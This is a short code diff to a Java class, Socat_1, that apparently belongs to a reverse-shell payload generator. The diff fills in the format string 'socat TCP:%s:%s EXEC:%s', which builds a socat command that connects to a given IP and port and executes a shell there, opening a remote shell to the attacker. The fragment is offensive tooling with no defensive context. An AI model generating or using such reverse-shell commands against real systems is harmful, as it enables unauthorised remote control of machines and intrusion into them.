@@ -8,7 +8,7 @@
 
         public Socat_1(String localIP, int localPort, LISTENER listener, SHELLS shellType){
             super(localIP, localPort, listener, shellType);
-            shellFormat = String.format("",this.getLocalIP() ,this.getLocalPort(), this.getShell());
+            shellFormat = String.format("socat TCP:%s:%s EXEC:%s",this.getLocalIP() ,this.getLocalPort(), this.getShell());
         }
 
         @Override
